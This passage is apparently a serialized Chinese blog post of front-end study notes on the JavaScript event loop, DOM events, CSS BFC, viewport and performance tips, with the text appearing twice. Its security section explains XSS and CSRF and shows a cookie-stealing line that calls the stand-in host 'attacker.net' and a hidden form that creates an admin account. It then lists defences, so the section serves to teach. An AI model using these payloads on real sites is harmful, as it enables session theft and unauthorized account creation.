FIRED\n```\n上面代码中，由于process.nextTick方法指定的回调函数，总是在当前\"执行栈\"的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前\"执行栈\"执行。\n```js\nsetImmediate(function (){\n  setImmediate(function A() {\n    console.log(1);\n    setImmediate(function B(){console.log(2);});\n  });\n\n  setTimeout(function timeout() {\n    console.log('TIMEOUT FIRED');\n  }, 0);\n});\n// 1\n// TIMEOUT FIRED\n// 2\n```\n上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1--TIMEOUT FIRED--2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行\n\n我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前\"执行栈\"一次执行完，多个setImmediate可能则需要多次loop才能执行完。\n## 事件模型\n### DOM0级模型\n又称为原始事件模型，在该模型中，事件不会传播，即没有事件流的概念。事件绑定监听函数比较简单, 有两种方式:\n* HTML代码中直接绑定:\n```html\n<input type=\"button\" onclick=\"fun()\">\n```\n* 通过JS代码指定属性值:\n\n```js\nvar btn = document.getElementById('.btn');\nbtn.onclick = fun;\n//移除监听函数：\n\nbtn.onclick = null;\n```\n### DOM2级模型\n属于W3C标准模型，现代浏览器(除IE6-8之外的浏览器)都支持该模型。在该事件模型中，一次事件共有三个过程:\n* 事件捕获阶段(capturing phase)。事件从document一直向下传播到目标元素, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。\n* 事件处理阶段(target phase)。事件到达目标元素, 触发目标元素的监听函数。\n* 事件冒泡阶段(bubbling phase)。事件从目标元素冒泡到document, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。\n\n事件绑定监听函数的方式如下:\n```js\naddEventListener(eventType, handler, useCapture)\n```\n事件移除监听函数的方式如下:\n```js\nremoveEventListener(eventType, handler, useCapture)\n```\n参数说明:\n\n* eventType指定事件类型(不要加on)\n* handler是事件处理函数\n* useCapture是一个boolean用于指定是否在捕获阶段进行处理，一般设置为false与IE浏览器保持一致。\n# css篇\n## overflow:hidden清除浮动原理\n* BFC （Block Formatting Context）全称是块级格式化上下文，用于对块级元素排版，默认情况下只有根元素（body)一个块级上下文，但是如果一个块级元素 设置了float:left，overflow:hidden或position:absolute样式，就会为这个块级元素生成一个独立的块圾上下文，就像在window全局作用域内，声明了一个function就会生成 一个独立的作用域一样，新开僻的BFC像是开僻了一个新的小宇宙，使这个块圾元素内部的排版完全独立隔绝。\n* 独立的块级上下文可以包裹浮动流，全部浮动子元素也不会引起容器高度塌陷，也就是说包含块会把浮动元素的高度也计算在内，所以不用清除浮动来撑起高度。\n\n如何触发BFC\n1. 根元素\n2. float的值不为none\n3. overflow的值不为visible\n4. display的值为inline-block、table-cell、table-caption\n5. position的值为absolute或fixed\n6. display：table也认为可以生成BFC，其实这里的主要原因在于Table会默认生成一个匿名的table-cell，正是这个匿名的table-ccell生成了BFC\n\nBFC的应用\n1. 解决margin重叠问题\n\n相邻的垂直元素同时设置了margin后，实际margin值会塌陷到其中较大的那个值。其根本原理就是它们处于同一个BFC，符合“属于同一个BFC的两个相邻元素的margin会发生重叠”的规则。\n2. 解决浮动问题\n\n当在父元素中设置overflow:hidden时就会触发BFC，所以他内部的元素就不会影响外面的布局，BFC就把浮动的子元素高度当做了自己内部的高度去处理溢出，所以外面看起来是清除了浮动\n\n3. 解决侵占浮动元素的问题\n\n当一个元素浮动，另一个元素不浮动时，浮动元素因为脱离文档流就会盖在不浮动的元素上。\n```css\n.box1 {\n  float: left;\n  width: 100px;\n  height: 100px;\n  background-color: pink;\n}\n\n.box2 {\n  width: 200px;\n  height: 200px;\n  background-color: skyblue;\n}\n\n```\n![pic](640.webp)\n我们做如下修改：\n```css\n.box2 {\n  width: 200px;\n  height: 200px;\n  background-color: skyblue;\n  overflow: hidden;\n}\n/* 或者是 */\n.box2 {\n  width: 200px;\n  height: 200px;\n  background-color: skyblue;\n  /* overflow: hidden; */\n  float: left;\n}\n```\n![pic](641.webp)\n我们为非浮动元素建立BFC环境，根据BFC的不与float box重叠的规则，解决了侵占元素问题。\n\n这一特性，我认为还是很有用的，特别是应用在两栏布局上，对比我们常规为非浮动元素或非定位元素设置margin来挤开的方法，其优点在于不需要去知道浮动或定位元素的宽度。\n\n\n## inline-block和float的共性和区别\n**共性**：\n\n* inline-block: 是把一个元素的display设置为块状内联元素，意思就是说，让一个元素的容器inline展示，并且里面的内容block展示；inline属性使元素内联展示，内联元素设置宽度无效，相邻的inline元素会在一行显示不换行，直到本行排满为止。block的元素始终会独占一行，呈块状显示，可设置宽高。所以inline-block的元素就是宽高可设置，相邻的元素会在一行显示，直到本行排满，也就是让元素的容器属性为block，内容为inline。\n* float： 设置元素的浮动为左或者右浮动，当设置元素浮动时，相邻元素会根据自身大小，排满一行，如果父容器宽度不够则会换行。当我们设置了元素的浮动时，这个元素就脱离了文档流，相邻元素会呈环绕装排列。\n\n两者共同点是都可以实现元素在一行显示，并且可以自由设置元素大小。\n\n\n**区别**：\n* inline-block: 水平排列一行，即使元素高度不一，也会以高度最大的元素高度为行高，即使高度小的元素周围留空，也不回有第二行元素上浮补位。可以设置默认的垂直对齐基线。\n* float: 让元素脱离当前文档流，呈环绕装排列，如遇上行有空白，而当前元素大小可以挤进去，这个元素会在上行补位排列。默认是顶部对齐。\n# html篇\n## meta标签中的Viewport\n### Viewport 有几个属性\n* width：控制 viewport 的大小，你可以给它指定一个值，如：600，或者甚至还可以给它一个特殊的值，如：device-width，device-width为设备的宽度（单位为缩放为 100% 时的 CSS 的像素）。\n* height：与 width 相对应，指定viewport 高度。\n* initial-scale：初始缩放比例，也即是当页面第一次 load 的时候缩放比例。\n* maximum-scale：允许用户缩放到的最大比例。\n* minimum-scale：允许用户缩放到的最小比例。\n* user-scalable：是否允许用户手动缩放。\n### Viewport囊括了三个视窗\n#### 视觉视窗\n就是指代整个屏幕的可视区域，当然不包括浏览器的导航位置\n![实例](meta-viewport-usage-1.jpg)\n#### 布局视窗\n布局视窗跟视觉视窗不一样，它不是指设备屏幕区域，它是为了解决PC 端网站在移动端显示不佳的一个解决方案\n![实例](meta-viewport-usage-2.jpg)\n#### 理想视窗\n这个理想视窗是为了布局视窗而生的，为什么这么说，因为它是基于布局视窗的。他其实就是变了尺寸的布局视窗。理想视窗就是把布局视窗调整到合适的状态，让页面有最好的表面效果，这也是它名字的由来。设置了理想视窗用户就不再需要对页面进行缩放，因为浏览器已经帮你把页面调整到最佳的显示状态了。而你要做的就是告诉浏览器，你要他这么做就OK了。就下面这一段代码就可以让浏览器乖乖地把布局视窗调整到最理想的状态\n# 优化篇\n## 网络加载类\n### 域名收敛\n对于PC 上的DNS 通常情况下就是几十ms. 因为PC可以存储很多的域名地址,而且TTL长着呢. 但是，对于手机端来说, 由于我们良心的3G和4G网络运营商节省开支的缘由, 一般在手机端上解析DNS 会到1s+. 所以，这样算下来， 首屏3s的最佳时间，你就已经没了1/3, 那还玩个屁. 不过，我们可以用很多预加载技术，比如localstorage,session,manifest等预先存储资源. 在PC上极度推崇domian sharding时, 在手机端上，此法不见得能行得通了.\n所以, 一般来说，在手机端上的域名数不能超过5个。 基本上的分配就是\nhtml +1\ncss +1 \nimg +1\njs +1\nfonts +1\n当然，这得看具体应用场景了. \n### 避免页面中空的 href 和 src\n当 link标签的 href 属性为空，或script、img、iframe标签的 src 属性为空时，浏览器在渲染的过程中仍会将 href 属性或 src 属性中的空内容进行加载，直到加载失败，这样就阻塞了页面中其他资源的下载进程，而且最终加载到的内容是无效的，因此要尽量避免。\n```html\n<!-- 不推荐 -->\n<img src=\"\" alt=\"photo\">\n<a href=\"\"></a>\n```\n\n### 合理设置 Etag 和 Last-Modified\n合理设置 Etag 和 Last-Modified 使用浏览器缓存，对于未修改的文件，静态资源服务器会向浏览器端返回 304 ，让浏览器从缓存中读取文件，减少 Web 资源下载的带宽消耗并降低服务器负载。\n```html\n<meta http-equiv=\"Last-Modified\" content=\"Mon, 03 Oct 2017 17:45:57 GMT\" />\n```\n### 减少页面重定向\n页面每次重定向都会延长页面内容返回的等待延时，一次重定向大约需要 600 毫秒的时间开销，为了保证用户尽快看到页面的内容，要尽量避免页面重定向。\n\n### 使用静态资源分域存放来增加下载并行数\n浏览器在同一时刻向同一个域名请求文件的并行下载数是有限的，因此可以利用多个域名的主机来存放不同的静态资源，增大页面加载时资源的并行下载数，缩短页面资源加载的时间。通常根据多个域名来分别存储 JavaScript、CSS 和图片文件。\n\n**但是这个策略需要慎用，因为过多的域名会造成DNS解析开销**\n\n### CDN\n#### 使用静态资源 CDN 来存储文件\n如果条件允许，可以利用 CDN 网络加快同一个地理区域内重复静态资源文件的响应下载速度，缩短资源请求时间。\n#### 使用 CDN Combo 下载传输内容\nCDN Combo 是在 CDN 服务器端将多个文件请求打包成一个文件的形式来返回的技术，这样可以实现 HTTP 连接传输的一次复用，减少浏览器的 HTTP 请求数，加快资源下载速度。例如同一个域名 CDN 服务器上的 a.js，b.js，c.js 就可以按如下方式在一个请求中下载。\n\n```html\n<script src=\"//cdn.domain.com/path/a.js,b.js,c.js\"></script>\n```\n**这种方式我在微信公众号后台看到过**\n\n### 使用 GET 来完成 AJAX 请求\n使用 XMLHttpRequest 时，浏览器中的 POST 方法发送请求首先发送文件头，然后发送 HTTP 正文数据。而使用 GET 时只发送头部，所以在拉取服务端数据时使用 GET 请求效率更高。\n\n### 减少 Cookie 的大小并进行 Cookie 隔离\nHTTP 请求通常默认带上浏览器端的 Cookie 一起发送给服务器，所以在非必要的情况下，要尽量减少 Cookie 来减小 HTTP 请求的大小。对于静态资源，尽量使用不同的域名来存放，因为 Cookie 默认是不能跨域的，这样就做到了不同域名下静态资源请求的 Cookie 隔离。\n\n### 使用异步 JavaScript 资源\n异步的 JavaScript 资源不会阻塞文档解析，所以允许在浏览器中优先渲染页面，延后加载脚本执行。例如 JavaScript 的引用可以如下设置，也可以使用模块化加载机制来实现。比如 requireJS、Seajs等\n```html\n//使用defer时，加载后续文档元素的过程和main.js的加载是并行的，但main.js的执行要在页面所有元素解析完成之后才开始执行\n<script src=\"/main.js\" defer></script> \n//使用async时，加载后续文档元素的过程和main.js的加载是并行的\n<script src=\"/main.js\" async></script>\n\n```\n### 使用base64编码\n小文件应转换成base64编码，如小图，字体文件，音频等，尽量减少http请求\n```css\n.class-name {\n   background-image : url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAMAAABxsOwqAAAAYFBMVEWnxwusyQukxQudwQyZvgyhxAyfwgyxzAsUHQGOuA0aJAERGAFIXwSTugyEqgtqhghQZgUwQQIpOQKbuguVtQuKrAuCowp2kQlheghTbQZHWQU7SwVAVgQ6TgQlLwMeKwFOemyQAAAAVElEQVQI1y3JVRaAIAAF0UconXbvf5ei8HfPDIQQhBAAFE10iKig3SLRNN4SP/p+N08VC0YnfIlNWtqIkhg/TPYbCvhqdHAWRXPZSp3g3CWZvVLXC6OJA3ukv0AaAAAAAElFTkSuQmCC');\n}\n\n```\n### 图片/视频懒加载\n为了保证页面内容的最小化，加速页面的渲染，尽可能节省移动端网络流量，页面中的图片资源推荐使用懒加载实现，在页面滚动时动态载入图片。\n```html\n<img data-src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a1604f3efd980\" alt=\"懒加载图片\" >\n```\n### 使用 iconfont 代替图片图标\n在页面中尽可能使用 iconfont 来代替图片图标，这样做的好处有以下几个：\n\n* 使用 iconfont 体积较小，而且是矢量图，因此缩放时不会失真；\n* 可以方便地修改图片大小尺寸和呈现颜色。\n\n## 页面渲染类\n### 把 CSS 资源引用放到 HTML 文件顶部\n一般推荐将所有 CSS 资源尽早指定在 HTML 文档 <head> 中，这样浏览器可以优先加载 CSS 并尽早完成页面渲染。\n### JavaScript 资源引用放到 HTML 文件底部\nJavaScript 资源放到 HTML 文档底部可以防止 JavaScript 的加载和解析执行对页面渲染造成阻塞。由于 JavaScript 资源默认是解析阻塞的，除非被标记为异步或者通过其他的异步方式加载，否则会阻塞 HTML DOM 解析和 CSS 渲染的过程。\n### 不要在 HTML 中直接缩放图片\n在 HTML 中直接缩放图片会导致页面内容的重排重绘，此时可能会使页面中的其他操作产生卡顿，因此要尽量减少在页面中直接进行图片缩放。\n### 减少 DOM 元素数量和深度\nHTML 中标签元素越多，标签的层级越深，浏览器解析 ** DOM** 并绘制到浏览器中所花的时间就越长，所以应尽可能保持 DOM 元素简洁和层级较少。\n```html\n<!--不推荐-->\n<div>\n  <span>\n    <a href=\"javascript: void(0);\">\n      <img src=\"./path/photo.jpg\" alt=\"图片\">\n    </a>\n  </span>\n</div>\n\n<!--推荐-->\n<img src=\"./path/photo.jpg\" alt=\"图片\">\n```\n### 尽量避免使用 table、iframe等慢元素\ntable内容的渲染是将 table 的 DOM 渲染树全部生成完并一次性绘制到页面上的，所以在长表格渲染时很耗性能，应该尽量避免使用它，可以考虑使用列表元素 ul 代替。尽量使用异步的方式动态添加 iframe 内资源的下载进程会阻塞父页面静态资源的下载与 CSS 及 HTML DOM的解析。\n### 避免运行耗时的 Javascript\n长时间运行的 JavaScript 会阻塞浏览器构建 DOM 树、DOM 渲染树、渲染页面。所以，任何与页面初次渲染无关的逻辑功能都应该延迟加载执行，这和 JavaScript 资源的异步加载思路是一致的。\n### 避免使用 CSS 表达式或 CSS 滤镜\nCSS 表达式或 CSS 滤镜的解析渲染速度是比较慢的，在有其他解决方案的情况下应该尽量避免使用。\n```css\n/* 不推荐 */\n.opacity {\n  filter:progid:DXImageTransform.Microsoft.Alpha(opacity=50);\n}\n```\n# 安全\n## xss和csrf的原理以及怎么预防\n### XSS\n用户浏览网页时发送错误，向服务器请求 URL，比如www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板中：`<p>sorry,an error occurred</p>`，返回给用户。\n\n这个漏洞有一个显著的特征，应用程序没有进行任何过滤或净化措施，就非常容易受到攻击。`www.xxx.com/error.php?message=<script>alert(1)</script>`，当用户打开错误页面时，就会出现`<p><script>alert(1)</script></p>`，弹出一个消息框。\n\n显然，攻击人员不会很傻的仅仅 alert 一些消息，在 IE 中，如果开启跨站点脚本检测可能无法弹出消息。通常 XSS 都会伴随着会话劫持，攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。\n比如攻击者构造一个这样的 URL，message 信息如下\n```js\nvar i = new Image;\ni.src=\"http://attacker.net/\"+document.cookie;\n```\n这样被攻击者通过访问这个恶意的 URL，就会把 cookie 发送给黑客，黑客截获 cookie，就能执行用户的任意操纵。\n### OSRF\n跨站点请求伪造才是跨站伪造的重点内容，攻击者只需要创建一个看似无害的网站，致使受害者的浏览器直接向易受攻击的服务器提交一个请求，执行恶意代码。\n仍然需要考虑同源策略，以管理员创建新用户为例，\n```txt\nPOST /newUser.php HTTP/1.1\nHost: xxx.com\nCookie: SessionId=...\nContent-Length: ..\n\nname=ro&userrole=admin&password=123456&confirmpassword=123456\n```\n黑客构造的网站会提交一个 form 表单，并想办法让 form 隐藏：\n```html\n<!DOCTYPE html>\n<html>\n<body>\n  <form action=\"http://xxx.com/newUser.php\" method=\"POST\">\n    <input type=\"hidden\" name=\"name\" value=\"ro\">\n    <input type=\"hidden\" name=\"userrole\" value=\"admin\">\n    <input type=\"hidden\" name=\"password\" value=\"123456\">\n    <input type=\"hidden\" name=\"confirmpassword\" value=\"123456\">\n  </form>\n</body>\n</html>\n```\n当管理员已经登陆的情况下，访问这个恶意网站的时候，就会提交这段脚本，管理员都不知情。因为管理员已经登陆，无需考虑 Cookie 的问题，一个简单的 CSRF 如此。\n**应对办法**\n1. 对一些关键字和特殊字符进行过滤或 URL、HTML 编码，\"<>?\"或\"script，javascript\"；\n2. Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；\n4. 验证HTTP Referer\n3. 在请求中添加 token 并验证","source":"_posts/front-end-focus.md","raw":"---\ntitle: 前端疑难问题整理\ncatalog: true\ndate: 2018-02-27 16:22:04\nsubtitle:\nheader-img: post/IMG_2616.JPG\ntags:\n- javascript\n---\n# javascript篇\n## prototype和__proto__的关系是什么\n先看一段代码\n```js\nfunction Person( name, age ) { \n  this.name = name;\n  this.age = age;\n}\nvar p = new Person( 'xiaoming', 19 );\nconsole.log( p.__proto__ == Person.prototype );\n// true\n```\n`__proto__`是每个对象都有的一个属性，而`prototype`是函数才会有的属性，查找资料后是这么描述`__proto__`的：\n> 对象具有属性`__proto__`，可称为隐式原型，一个对象的隐式原型指向构造该对象的构造函数的原型，这也保证了实例能够访问在构造函数原型中定义的属性和方法。\n\n而`prototype`是这么描述的\n> 方法(Function)这个特殊的对象，除了和其他对象一样有上述__proto__属性之外，还有自己特有的属性——原型属性（prototype），这个属性是一个指针，指向一个对象，这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）。原型对象也有一个属性，叫做constructor，这个属性包含了一个指针，指回原构造函数。\n\n用一张简单的图就能概括二者关系\n![示例](20180228144215.jpg)\n\n## JavaScript 异步、栈、事件循环、任务队列\n嗯，还是开局一张图\n![示例](4020255170-59bc9e1671029_articlex.png)\n有这么一段代码\n```js\nfunction bar() {\n  console.log(1);\n}\n\nfunction foo() {\n  console.log(2);\n  bar();\n}\n\nsetTimeout(() => {\n    console.log(3)\n});\n\nfoo();\n```\n它在栈中的入栈、出栈过程，如下图：\n![示例](1021884518-59bc9e30d414a_articlex.png)\n\n看到这里，我就联想到了平时使用浏览器的debug功能的时候，在断点处停住时能看到的`call stack`。\n这里我们有个概念叫**任务队列**，js中，有两类任务队列：宏任务队列（macro tasks）和微任务队列（micro tasks）。宏任务队列可以有多个，微任务队列只有一个。下面是常见的一些任务的任务队列：\n* 宏任务：script（全局任务）, setTimeout, setInterval, setImmediate, I/O, UI rendering.\n* 微任务：process.nextTick, Promise, Object.observer, MutationObserver.\n比如有这样的代码\n```js\nsetTimeout(function() {\n    console.log('timeout1');\n})\n\nnew Promise(function(resolve) {\n    console.log('promise1');\n    for(var i = 0; i < 1000; i++) {\n        i == 99 && resolve();\n    }\n    console.log('promise2');\n}).then(function() {\n    console.log('then1');\n})\n\nconsole.log('global1');\n```\n比如上面这样的一段代码，`setTimeout`是一个宏任务源，所以里面的回调函数`console.log('timeout1')`会被加到宏任务队列中。到了Promise，输出promise1以及promise2，for循环内执行resolve时，由于Promise是一个微任务源，所以`console.log('then1')`回调会被加到微任务队列中。继续执行代码，输出grobal1。这个时候，执行栈上的代码已经执行完毕，所以此时我们执行微任务队列，此时的微任务队列上有`console.log('then1')`，所以浏览器输出then1。至此，一轮的事件循环已经执行完毕，开启新的一轮事件循环。也是从`宏任务->执行栈->微任务`。由于此时宏任务上有事件`console.log('timeout1')`，所以输出timeout1。这就是整段代码执行情况的理解。依次输出如下：\n```js\npromise1\npromise2\nglobal1\nthen1\ntimeout1\n```\n\n### nodejs中的process.nextTick和setImmediate\n```js\nprocess.nextTick(function A() {\n  console.log(1);\n  process.nextTick(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n  console.log('TIMEOUT FIRED');\n}, 0)\n// 1\n// 2\n// TIMEOUT FIRED\n```\n上面代码中，由于process.nextTick方法指定的回调函数，总是在当前\"执行栈\"的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前\"执行栈\"执行。\n```js\nsetImmediate(function (){\n  setImmediate(function A() {\n    console.log(1);\n    setImmediate(function B(){console.log(2);});\n  });\n\n  setTimeout(function timeout() {\n    console.log('TIMEOUT FIRED');\n  }, 0);\n});\n// 1\n// TIMEOUT FIRED\n// 2\n```\n上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1--TIMEOUT FIRED--2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行\n\n我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前\"执行栈\"一次执行完，多个setImmediate可能则需要多次loop才能执行完。\n## 事件模型\n### DOM0级模型\n又称为原始事件模型，在该模型中，事件不会传播，即没有事件流的概念。事件绑定监听函数比较简单, 有两种方式:\n* HTML代码中直接绑定:\n```html\n<input type=\"button\" onclick=\"fun()\">\n```\n* 通过JS代码指定属性值:\n\n```js\nvar btn = document.getElementById('.btn');\nbtn.onclick = fun;\n//移除监听函数：\n\nbtn.onclick = null;\n```\n### DOM2级模型\n属于W3C标准模型，现代浏览器(除IE6-8之外的浏览器)都支持该模型。在该事件模型中，一次事件共有三个过程:\n* 事件捕获阶段(capturing phase)。事件从document一直向下传播到目标元素, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。\n* 事件处理阶段(target phase)。事件到达目标元素, 触发目标元素的监听函数。\n* 事件冒泡阶段(bubbling phase)。事件从目标元素冒泡到document, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。\n\n事件绑定监听函数的方式如下:\n```js\naddEventListener(eventType, handler, useCapture)\n```\n事件移除监听函数的方式如下:\n```js\nremoveEventListener(eventType, handler, useCapture)\n```\n参数说明:\n\n* eventType指定事件类型(不要加on)\n* handler是事件处理函数\n* useCapture是一个boolean用于指定是否在捕获阶段进行处理，一般设置为false与IE浏览器保持一致。\n# css篇\n## overflow:hidden清除浮动原理\n* BFC （Block Formatting Context）全称是块级格式化上下文，用于对块级元素排版，默认情况下只有根元素（body)一个块级上下文，但是如果一个块级元素 设置了float:left，overflow:hidden或position:absolute样式，就会为这个块级元素生成一个独立的块圾上下文，就像在window全局作用域内，声明了一个function就会生成 一个独立的作用域一样，新开僻的BFC像是开僻了一个新的小宇宙，使这个块圾元素内部的排版完全独立隔绝。\n* 独立的块级上下文可以包裹浮动流，全部浮动子元素也不会引起容器高度塌陷，也就是说包含块会把浮动元素的高度也计算在内，所以不用清除浮动来撑起高度。\n\n如何触发BFC\n1. 根元素\n2. float的值不为none\n3. overflow的值不为visible\n4. display的值为inline-block、table-cell、table-caption\n5. position的值为absolute或fixed\n6. display：table也认为可以生成BFC，其实这里的主要原因在于Table会默认生成一个匿名的table-cell，正是这个匿名的table-ccell生成了BFC\n\nBFC的应用\n1. 解决margin重叠问题\n\n相邻的垂直元素同时设置了margin后，实际margin值会塌陷到其中较大的那个值。其根本原理就是它们处于同一个BFC，符合“属于同一个BFC的两个相邻元素的margin会发生重叠”的规则。\n2. 解决浮动问题\n\n当在父元素中设置overflow:hidden时就会触发BFC，所以他内部的元素就不会影响外面的布局，BFC就把浮动的子元素高度当做了自己内部的高度去处理溢出，所以外面看起来是清除了浮动\n\n3. 解决侵占浮动元素的问题\n\n当一个元素浮动，另一个元素不浮动时，浮动元素因为脱离文档流就会盖在不浮动的元素上。\n```css\n.box1 {\n  float: left;\n  width: 100px;\n  height: 100px;\n  background-color: pink;\n}\n\n.box2 {\n  width: 200px;\n  height: 200px;\n  background-color: skyblue;\n}\n\n```\n![pic](640.webp)\n我们做如下修改：\n```css\n.box2 {\n  width: 200px;\n  height: 200px;\n  background-color: skyblue;\n  overflow: hidden;\n}\n/* 或者是 */\n.box2 {\n  width: 200px;\n  height: 200px;\n  background-color: skyblue;\n  /* overflow: hidden; */\n  float: left;\n}\n```\n![pic](641.webp)\n我们为非浮动元素建立BFC环境，根据BFC的不与float box重叠的规则，解决了侵占元素问题。\n\n这一特性，我认为还是很有用的，特别是应用在两栏布局上，对比我们常规为非浮动元素或非定位元素设置margin来挤开的方法，其优点在于不需要去知道浮动或定位元素的宽度。\n\n\n## inline-block和float的共性和区别\n**共性**：\n\n* inline-block: 是把一个元素的display设置为块状内联元素，意思就是说，让一个元素的容器inline展示，并且里面的内容block展示；inline属性使元素内联展示，内联元素设置宽度无效，相邻的inline元素会在一行显示不换行，直到本行排满为止。block的元素始终会独占一行，呈块状显示，可设置宽高。所以inline-block的元素就是宽高可设置，相邻的元素会在一行显示，直到本行排满，也就是让元素的容器属性为block，内容为inline。\n* float： 设置元素的浮动为左或者右浮动，当设置元素浮动时，相邻元素会根据自身大小，排满一行，如果父容器宽度不够则会换行。当我们设置了元素的浮动时，这个元素就脱离了文档流，相邻元素会呈环绕装排列。\n\n两者共同点是都可以实现元素在一行显示，并且可以自由设置元素大小。\n\n\n**区别**：\n* inline-block: 水平排列一行，即使元素高度不一，也会以高度最大的元素高度为行高，即使高度小的元素周围留空，也不回有第二行元素上浮补位。可以设置默认的垂直对齐基线。\n* float: 让元素脱离当前文档流，呈环绕装排列，如遇上行有空白，而当前元素大小可以挤进去，这个元素会在上行补位排列。默认是顶部对齐。\n# html篇\n## meta标签中的Viewport\n### Viewport 有几个属性\n* width：控制 viewport 的大小，你可以给它指定一个值，如：600，或者甚至还可以给它一个特殊的值，如：device-width，device-width为设备的宽度（单位为缩放为 100% 时的 CSS 的像素）。\n* height：与 width 相对应，指定viewport 高度。\n* initial-scale：初始缩放比例，也即是当页面第一次 load 的时候缩放比例。\n* maximum-scale：允许用户缩放到的最大比例。\n* minimum-scale：允许用户缩放到的最小比例。\n* user-scalable：是否允许用户手动缩放。\n### Viewport囊括了三个视窗\n#### 视觉视窗\n就是指代整个屏幕的可视区域，当然不包括浏览器的导航位置\n![实例](meta-viewport-usage-1.jpg)\n#### 布局视窗\n布局视窗跟视觉视窗不一样，它不是指设备屏幕区域，它是为了解决PC 端网站在移动端显示不佳的一个解决方案\n![实例](meta-viewport-usage-2.jpg)\n#### 理想视窗\n这个理想视窗是为了布局视窗而生的，为什么这么说，因为它是基于布局视窗的。他其实就是变了尺寸的布局视窗。理想视窗就是把布局视窗调整到合适的状态，让页面有最好的表面效果，这也是它名字的由来。设置了理想视窗用户就不再需要对页面进行缩放，因为浏览器已经帮你把页面调整到最佳的显示状态了。而你要做的就是告诉浏览器，你要他这么做就OK了。就下面这一段代码就可以让浏览器乖乖地把布局视窗调整到最理想的状态\n# 优化篇\n## 网络加载类\n### 域名收敛\n对于PC 上的DNS 通常情况下就是几十ms. 因为PC可以存储很多的域名地址,而且TTL长着呢. 但是，对于手机端来说, 由于我们良心的3G和4G网络运营商节省开支的缘由, 一般在手机端上解析DNS 会到1s+. 所以，这样算下来， 首屏3s的最佳时间，你就已经没了1/3, 那还玩个屁. 不过，我们可以用很多预加载技术，比如localstorage,session,manifest等预先存储资源. 在PC上极度推崇domian sharding时, 在手机端上，此法不见得能行得通了.\n所以, 一般来说，在手机端上的域名数不能超过5个。 基本上的分配就是\nhtml +1\ncss +1 \nimg +1\njs +1\nfonts +1\n当然，这得看具体应用场景了. \n### 避免页面中空的 href 和 src\n当 link标签的 href 属性为空，或script、img、iframe标签的 src 属性为空时，浏览器在渲染的过程中仍会将 href 属性或 src 属性中的空内容进行加载，直到加载失败，这样就阻塞了页面中其他资源的下载进程，而且最终加载到的内容是无效的，因此要尽量避免。\n```html\n<!-- 不推荐 -->\n<img src=\"\" alt=\"photo\">\n<a href=\"\"></a>\n```\n\n### 合理设置 Etag 和 Last-Modified\n合理设置 Etag 和 Last-Modified 使用浏览器缓存，对于未修改的文件，静态资源服务器会向浏览器端返回 304 ，让浏览器从缓存中读取文件，减少 Web 资源下载的带宽消耗并降低服务器负载。\n```html\n<meta http-equiv=\"Last-Modified\" content=\"Mon, 03 Oct 2017 17:45:57 GMT\" />\n```\n### 减少页面重定向\n页面每次重定向都会延长页面内容返回的等待延时，一次重定向大约需要 600 毫秒的时间开销，为了保证用户尽快看到页面的内容，要尽量避免页面重定向。\n\n### 使用静态资源分域存放来增加下载并行数\n浏览器在同一时刻向同一个域名请求文件的并行下载数是有限的，因此可以利用多个域名的主机来存放不同的静态资源，增大页面加载时资源的并行下载数，缩短页面资源加载的时间。通常根据多个域名来分别存储 JavaScript、CSS 和图片文件。\n\n**但是这个策略需要慎用，因为过多的域名会造成DNS解析开销**\n\n### CDN\n#### 使用静态资源 CDN 来存储文件\n如果条件允许，可以利用 CDN 网络加快同一个地理区域内重复静态资源文件的响应下载速度，缩短资源请求时间。\n#### 使用 CDN Combo 下载传输内容\nCDN Combo 是在 CDN 服务器端将多个文件请求打包成一个文件的形式来返回的技术，这样可以实现 HTTP 连接传输的一次复用，减少浏览器的 HTTP 请求数，加快资源下载速度。例如同一个域名 CDN 服务器上的 a.js，b.js，c.js 就可以按如下方式在一个请求中下载。\n\n```html\n<script src=\"//cdn.domain.com/path/a.js,b.js,c.js\"></script>\n```\n**这种方式我在微信公众号后台看到过**\n\n### 使用 GET 来完成 AJAX 请求\n使用 XMLHttpRequest 时，浏览器中的 POST 方法发送请求首先发送文件头，然后发送 HTTP 正文数据。而使用 GET 时只发送头部，所以在拉取服务端数据时使用 GET 请求效率更高。\n\n### 减少 Cookie 的大小并进行 Cookie 隔离\nHTTP 请求通常默认带上浏览器端的 Cookie 一起发送给服务器，所以在非必要的情况下，要尽量减少 Cookie 来减小 HTTP 请求的大小。对于静态资源，尽量使用不同的域名来存放，因为 Cookie 默认是不能跨域的，这样就做到了不同域名下静态资源请求的 Cookie 隔离。\n\n### 使用异步 JavaScript 资源\n异步的 JavaScript 资源不会阻塞文档解析，所以允许在浏览器中优先渲染页面，延后加载脚本执行。例如 JavaScript 的引用可以如下设置，也可以使用模块化加载机制来实现。比如 